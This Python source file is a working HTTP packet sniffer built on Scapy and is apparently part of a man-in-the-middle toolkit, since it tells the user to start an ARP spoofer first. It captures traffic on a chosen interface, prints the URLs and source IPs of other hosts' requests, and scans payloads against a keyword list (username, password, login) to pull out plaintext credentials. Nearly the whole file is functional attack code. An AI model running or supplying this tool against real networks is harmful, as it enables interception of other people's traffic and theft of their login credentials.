from typing import Optional
from asyncio import subprocess
import time
from colorama import Fore
from colorama import Style
import scapy.all 
from scapy.layers import http
from scapy.packet import Packet
from scapy.layers.inet import IP
import psutil
from prettytable import PrettyTable
import subprocess
import re



choice = 'Y'

def get_current_mac(interface: str) -> Optional[str]:
    '''
        Retrieves the MAC address of a specified network interface.

        This function executes the 'ifconfig' command for the given interface using the subprocess module,
        and parses its output to extract the MAC address. The regular expression used matches the typical
        MAC address format (xx:xx:xx:xx:xx:xx). 

        Args:
            interface (str): The name of the network interface (e.g., 'eth0', 'wlan0').

        Returns:
            str: The MAC address in standard colon-separated format. Returns None if no MAC address
            is found or if an error occurs during the subprocess execution.

        Raises:
            subprocess.CalledProcessError: If there's an error executing the 'ifconfig' command.

        Note:
            - This function assumes the standard output format of 'ifconfig' command and may not
              work as expected if the output format is different.
    '''

    try:
        output = subprocess.check_output(['ifconfig', interface])
        pattern = re.compile(r'\w\w:\w\w:\w\w:\w\w:\w\w:\w\w')
        output_string = output.decode()
        match = pattern.search(output_string)

        if match:
            return match.group(0)
        else:
            return None

    except subprocess.CalledProcessError as e:
        print(f"An error occurred while processing interface '{interface}': {e}")
        return None

def get_current_ip(interface: str) -> Optional[str]:
    '''
        Retrieves the IP address of a specified network interface.

        Executes the 'ifconfig' command for the provided interface and parses the output
        to find the IP address. The IP address is extracted using a regular expression,
        which matches the standard IPv4 address format (xxx.xxx.xxx.xxx). 
        The output of the 'ifconfig' command is decoded from bytes to a string before applying the regex.

        Args:
            interface (str): The name of the network interface (e.g., 'eth0', 'wlan0').

        Returns:
            str: The IP address of the interface. Returns None if no IP address is found
            or if an error occurs during subprocess execution.

        Raises:
            subprocess.CalledProcessError: If there's an error executing the 'ifconfig' command.

        Note:
            - This function does not validate the extracted IP address beyond the regex pattern match.
            - It also depends on the specific output format of 'ifconfig' and may require adjustments
              if used in environments with different 'ifconfig' output formats.
    '''

    try:
        output = subprocess.check_output(["ifconfig", interface])
        pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
        output_string = output.decode()
        match = pattern.search(output_string)

        if match:
            return match.group(0)
        else:
            return None
    
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while processing interface '{interface}': {e}")
        return None

def ip_table() -> None:
    '''
        Print a table of network interfaces and their corresponding MAC addresses and IP addresses.

        Utilizes psutil to gather network interface details and PrettyTable for tabular display. 
        Each row contains the interface name, MAC address, and IP address. 
        Rows indicate the absence of a MAC or IP address with a colored message. Colorama is used for text coloring.

        Args:
            None

        Returns:
            None

        The function depends on `get_current_mac` and `get_current_ip` to retrieve MAC and IP addresses.
    '''

    addrs = psutil.net_if_addrs() # Get all the interface details in with psutil in a variable
    t = PrettyTable([f'{Fore.GREEN}Interface', 'MAC Address', f'IP Address{Style.RESET_ALL}'])

    for interface_name, _ in addrs.items():
        mac = get_current_mac(interface_name)
        ip = get_current_ip(interface_name)

        if ip and mac:
            t.add_row([interface_name, mac, ip])
        elif mac:
            t.add_row([interface_name, mac, f'{Fore.YELLOW}No IP assigned{Style.RESET_ALL}'])
        elif ip:
            t.add_row([interface_name, f'{Fore.YELLOW}No MAC assigned{Style.RESET_ALL}', ip])
    print(t)

def sniff(interface: str) -> None:
    '''
        Uses Scapy to sniff packets on a specified network interface.
        Each captured packet is passed to the function `process_sniffed_packet` for processing.

        Args:
            interface (str): The name of the network interface (e.g., 'eth0', 'wlan0').

        Returns: 
            None

        Note:
        - `process_sniffed_packet` is a function that takes a packet as an argument and processes it.
        - Packets are not stored in memory (`store=False`), enhancing performance during long sniffing sessions.
        - The function is configured to capture all packets. To filter for specific protocols or ports,
          uncomment and modify the commented line.
    '''

    # Uncomment and modify the line below to sniff packets on a specific port (e.g., HTTP port 80)
    # scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 80")
    scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet: Packet) -> None:
    '''
        Processes a network packet to detect and handle HTTP requests.

        The function checks if the packet contains an HTTP request layer. If it does:
        1. Prints a message indicating an HTTP request was captured.
        2. Calls `url_extractor(packet)` to extract and display the URL from the packet.
        3. Calls `get_login_info(packet)` to extract login credentials (if any) from the packet.
        4. If login information is found, prints the credentials.
        5. If the global variable `choice` is set to 'Y' or 'y', calls `raw_http_request(packet)` 
        to display the raw HTTP request.

        Args:
            packet (packet): A packet captured by Scapy's `sniff()` function, expected to potentially contain HTTP traffic.

        Returns:
            None

        Note:
            This function relies on the external functions `url_extractor`, `get_login_info`, and `raw_http_request`.
            The `choice` global variable controls whether the raw HTTP request is printed.
    '''

    if packet.haslayer(http.HTTPRequest):
        print("[+] HTTP REQUEST >>>>>")
        url_extractor(packet)
        credentials = get_login_info(packet)

        if credentials:
            print(f"{Fore.GREEN}[+] Username OR password is Send >>>> ", credentials, f"{Style.RESET_ALL}")
        
        if choice in ['Y', 'y']:
            raw_http_request(packet)

def get_login_info(packet: Packet) -> Optional[str]:
    '''
        Extracts and returns potential login information from a network packet.

        The function checks if the packet contains a Raw data layer. If present, it extracts
        the payload ('load' field) from this layer. The payload is then decoded into a string
        for keyword searching.

        A predefined list of keywords commonly associated with login forms (e.g., 'username', 'password') 
        is used to search within the decoded payload. If any of these keywords are found, the entire 
        decoded payload is returned, as it may contain login information.

        Args:
            packet (Packet): A packet captured by Scapy's `sniff()` function, potentially containing Raw data.

        Returns:
            Optional[str]: The decoded payload string if login-related keywords are found; otherwise, None.

        Note:
            This function does not guarantee the extraction of valid login credentials but searches
            for potential indicators of such information based on common keyword presence.
    '''
    if packet.haslayer(scapy.all.Raw):
        load = packet[scapy.all.Raw].load
        load_decode = load.decode().lower()
        keywords = ["username", "user", "email", "pass", "login", "password", "UserName", "Password"]
        for keyword in keywords:
            if keyword in load_decode: # Case-insensitive search
                return load_decode

def url_extractor(packet: Packet) -> None:
    '''
        Extracts and prints URL information from an HTTP request within a network packet, 
        along with the source IP address.

        The function checks if the packet contains both HTTPRequest and IP layers. If present,
        it extracts the HTTP request details (Method, Host, Path) and the source IP address. 
        Each field in the HTTPRequest layer is decoded from a bytestring to a string. 
        If any of the HTTP fields are missing, fallback values ('Unknown Method', 'Unknown Host', 
        'Unknown Path') are used.

        The function then prints the source IP address, followed by the HTTP request method, host, and path.

        Args:
            packet (Packet): A packet captured by Scapy's `sniff()` function, expected to contain both HTTPRequest and IP layers.

        Note:
            This function assumes the packet contains the necessary HTTPRequest and IP layers.
            It will print the URL information and source IP address if these layers are present.
    '''
    if packet.haslayer(http.HTTPRequest) and packet.haslayer(IP):
        http_layer = packet[http.HTTPRequest]
        ip_layer = packet[IP]
        method = http_layer.Method.decode() if http_layer.Method else "Unknown Method"
        host = http_layer.Host.decode() if http_layer.Host else "Unknown Host"
        path = http_layer.Path.decode() if http_layer.Path else "Unknown Path"
        src_ip = ip_layer.src
        print(f"{src_ip} just requested \n{method} {host} {path}")
    return

def raw_http_request(packet: Packet) -> None:
    '''
        Prints the fields of the HTTPRequest layer from a captured packet in a formatted table.

        Iterates over the fields of the HTTPRequest layer, attempting to decode each value. 
        Fields and their decoded values (if decodable) are printed in a key-label format. 
        The function encapsulates this process in a try-except block to gracefully handle
        any unexpected errors and to continue execution without interruption.

        Args:
            packet (Packet): A packet captured by Scapy's `sniff()` function, expected to contain 
                            an HTTPRequest layer.

        Returns:
            None

        Note:
            This function is designed to print detailed information about the HTTPRequest layer.
            Uncomment the provided line in the code to print the entire HTTP layer as a raw packet.
    '''
    if packet.haslayer(http.HTTPRequest):
        http_layer = packet[http.HTTPRequest].fields
        print("-----------------***Raw HTTP Packet***-------------------")
        print("{:<8} {:<15}".format('Key','Label'))
        try:
            for key, value in http_layer.items():
                try:
                    label = value.decode() if isinstance(value, bytes) else str(value)
                except:
                    pass
                print("{:<40} {:<15}".format(key,label)) 
        except KeyboardInterrupt:
            print("\n[+] Quitting Program...")  
        print("---------------------------------------------------------")
    # TO PRINT A SOLE RAW PACKET UNCOMMENT THE BELOW LINE
    # print(httplayer)

def main_sniff() -> None:
    '''
        The main function of the packet sniffer program.

        Displays a welcome message in blue and a warning in yellow, advising users to start
        the ARP spoofer before proceeding. It captures user input to determine whether to print
        raw packets during sniffing. The function showcases network interfaces and initiates packet
        sniffing on a user-specified interface. It gracefully handles a manual exit (Ctrl+C) by the user.

        The process involves:
        - Prompting the user to decide on printing raw packets.
        - Displaying network interface details using `ip_table()`.
        - Asking for the interface name to sniff packets on.
        - Initiating packet capture with `sniff(interface)`.
        - Exiting the function after a brief pause or upon KeyboardInterrupt, indicating the user's desire to stop packet sniffing.

        Args:
            None

        Returns:
            None

        Global Variables:
            choice (str): Stores the user's choice about printing raw packets ('Y' or 'N').

        Exception Handling:
            KeyboardInterrupt: Catches Ctrl+C input to safely exit the sniffing process with a message.

        Note:
            Users are reminded to ensure ARP spoofing is active to capture packets effectively.
    '''
    print(f"{Fore.BLUE}Welcome To Packet Sniffer{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[***] Please Start Arp Spoofer Before Using this Module [***] {Style.RESET_ALL}")
    try:
        global choice
        choice = input("[*] Do you want to print the raw Packet : Y?N : ")
        ip_table()
        interface = input("[*] Please enter the interface name : ")
        print("[*] Sniffing Packets...")
        sniff(interface)
        print(f"{Fore.YELLOW}\n[*] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)

main_sniff()